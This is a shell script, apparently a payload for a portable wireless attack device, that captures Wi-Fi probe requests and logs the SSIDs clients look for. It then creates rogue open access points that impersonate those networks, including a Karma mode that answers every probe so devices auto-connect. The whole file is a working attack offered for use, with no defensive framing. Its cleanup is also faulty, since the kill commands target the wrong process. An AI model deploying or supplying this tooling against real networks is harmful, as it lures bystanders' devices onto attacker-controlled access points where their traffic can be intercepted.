#!/bin/bash
# Title: Probe Attack
# Author: NullSec
# Description: Exploits probe requests to lure clients by creating matching APs
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/probeattack"
mkdir -p "$LOOT_DIR"

PROMPT "PROBE ATTACK

Capture probe requests
and create matching APs
to lure clients.

Features:
- Probe request capture
- Auto AP creation
- Client association log
- SSID harvesting
- Karma-style response

WARNING: Active attack.

Press OK to configure."

# Check dependencies
MISSING=""
command -v airodump-ng >/dev/null 2>&1 || MISSING="${MISSING}aircrack-ng "
command -v hostapd >/dev/null 2>&1 || command -v hostapd-mana >/dev/null 2>&1 || MISSING="${MISSING}hostapd "

if [ -n "$MISSING" ]; then
    ERROR_DIALOG "Missing tools: $MISSING

Install with opkg."
    exit 1
fi

# Find monitor interface
MONITOR_IF=""
for iface in wlan1mon wlan2mon mon0; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done
[ -z "$MONITOR_IF" ] && { ERROR_DIALOG "No monitor interface!

airmon-ng start wlan1"; exit 1; }

# Find AP-capable interface
AP_IFACE=""
for iface in wlan0 wlan2; do
    [ -d "/sys/class/net/$iface" ] && AP_IFACE="$iface" && break
done
[ -z "$AP_IFACE" ] && AP_IFACE="wlan0"

PROMPT "ATTACK MODE:

1. Passive probe harvest
2. Targeted AP creation
3. Mass AP (top probes)
4. Karma (respond to all)

Monitor: $MONITOR_IF
AP iface: $AP_IFACE

Select mode next."

ATTACK_MODE=$(NUMBER_PICKER "Mode (1-4):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) ATTACK_MODE=1 ;; esac

SCAN_DURATION=$(NUMBER_PICKER "Scan time (seconds):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SCAN_DURATION=30 ;; esac

resp=$(CONFIRMATION_DIALOG "START PROBE ATTACK?

Mode: $ATTACK_MODE
Scan: ${SCAN_DURATION}s
Monitor: $MONITOR_IF
AP: $AP_IFACE

Confirm?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M)
PROBE_LOG="$LOOT_DIR/probes_$TIMESTAMP.log"
CLIENT_LOG="$LOOT_DIR/clients_$TIMESTAMP.log"

# Phase 1: Capture probe requests
LOG "Capturing probe requests..."
SPINNER_START "Listening for probes..."

PROBE_FILE="/tmp/probes_$$"
timeout "$SCAN_DURATION" tcpdump -i "$MONITOR_IF" -e -s 256 type mgt subtype probe-req 2>/dev/null | \
    grep -oE "Probe Request \(.*\)" | sed 's/Probe Request (\(.*\))/\1/' | sort | uniq -c | sort -rn > "$PROBE_FILE"

# Also capture with airodump if possible
AIRODUMP_CSV="/tmp/airodump_$$"
timeout "$SCAN_DURATION" airodump-ng "$MONITOR_IF" --output-format csv -w "$AIRODUMP_CSV" 2>/dev/null &
AIRO_PID=$!
sleep "$SCAN_DURATION"
kill $AIRO_PID 2>/dev/null

SPINNER_STOP

PROBE_COUNT=$(wc -l < "$PROBE_FILE" 2>/dev/null | tr -d ' ')
TOP_PROBES=$(head -10 "$PROBE_FILE")

# Save probe log
cp "$PROBE_FILE" "$PROBE_LOG"

PROMPT "PROBES CAPTURED: $PROBE_COUNT

Top requested SSIDs:
$TOP_PROBES

Press OK to continue."

case $ATTACK_MODE in
    1) # Passive harvest only
        PROMPT "PROBE HARVEST DONE

Captured $PROBE_COUNT
unique SSIDs from
client probes.

Saved: $PROBE_LOG

Press OK to exit."
        ;;

    2) # Targeted AP creation
        TARGET_SSID=$(TEXT_PICKER "SSID to spoof:" "$(head -1 "$PROBE_FILE" | awk '{$1=""; print}' | xargs)")
        case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

        SPINNER_START "Creating rogue AP..."

        # Configure hostapd
        HOSTAPD_CONF="/tmp/probe_hostapd_$$.conf"
        cat > "$HOSTAPD_CONF" << EOF
interface=$AP_IFACE
ssid=$TARGET_SSID
channel=6
hw_mode=g
auth_algs=1
wmm_enabled=0
EOF
        hostapd "$HOSTAPD_CONF" -B 2>/dev/null
        HOSTAPD_PID=$!
        SPINNER_STOP

        PROMPT "ROGUE AP ACTIVE

SSID: $TARGET_SSID
Interface: $AP_IFACE

Waiting for clients
to connect...

Press OK to stop."

        kill $HOSTAPD_PID 2>/dev/null
        rm -f "$HOSTAPD_CONF"
        ;;

    3) # Mass AP - top probed SSIDs
        MAX_APS=$(NUMBER_PICKER "Max APs (1-5):" 3)
        case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MAX_APS=3 ;; esac

        SPINNER_START "Creating multiple APs..."

        HOSTAPD_CONF="/tmp/probe_mass_$$.conf"
        SSID_LIST=""
        COUNT=0

        while IFS= read -r line && [ $COUNT -lt $MAX_APS ]; do
            SSID=$(echo "$line" | awk '{$1=""; print}' | xargs)
            [ -z "$SSID" ] && continue
            SSID_LIST="${SSID_LIST}${SSID}\n"
            COUNT=$((COUNT + 1))
        done < "$PROBE_FILE"

        # Use first SSID for single AP (multi-SSID requires special setup)
        FIRST_SSID=$(echo -e "$SSID_LIST" | head -1)
        cat > "$HOSTAPD_CONF" << EOF
interface=$AP_IFACE
ssid=$FIRST_SSID
channel=6
hw_mode=g
auth_algs=1
EOF
        hostapd "$HOSTAPD_CONF" -B 2>/dev/null
        HOSTAPD_PID=$!
        SPINNER_STOP

        PROMPT "MASS AP ACTIVE

Broadcasting SSIDs:
$(echo -e "$SSID_LIST" | head -5)

Waiting for clients...

Press OK to stop."

        kill $HOSTAPD_PID 2>/dev/null
        rm -f "$HOSTAPD_CONF"
        ;;

    4) # Karma mode
        SPINNER_START "Starting Karma attack..."

        if command -v hostapd-mana >/dev/null 2>&1; then
            KARMA_CONF="/tmp/karma_$$.conf"
            cat > "$KARMA_CONF" << EOF
interface=$AP_IFACE
ssid=FreeWiFi
channel=6
hw_mode=g
auth_algs=1
enable_karma=1
karma_loud=1
EOF
            hostapd-mana "$KARMA_CONF" -B 2>/dev/null
            KARMA_PID=$!
        else
            # Fallback: create open AP with common SSID
            KARMA_CONF="/tmp/karma_$$.conf"
            cat > "$KARMA_CONF" << EOF
interface=$AP_IFACE
ssid=FreeWiFi
channel=6
hw_mode=g
auth_algs=1
EOF
            hostapd "$KARMA_CONF" -B 2>/dev/null
            KARMA_PID=$!
        fi
        SPINNER_STOP

        PROMPT "KARMA ATTACK ACTIVE

Responding to all
probe requests.

Clients will auto-
connect to our AP.

Press OK to stop."

        kill $KARMA_PID 2>/dev/null
        rm -f "$KARMA_CONF"
        ;;
esac

# Cleanup
rm -f "$PROBE_FILE" "${AIRODUMP_CSV}"*

PROMPT "PROBE ATTACK DONE

Probes harvested: $PROBE_COUNT
Logs saved to:
$LOOT_DIR/

Press OK to exit."
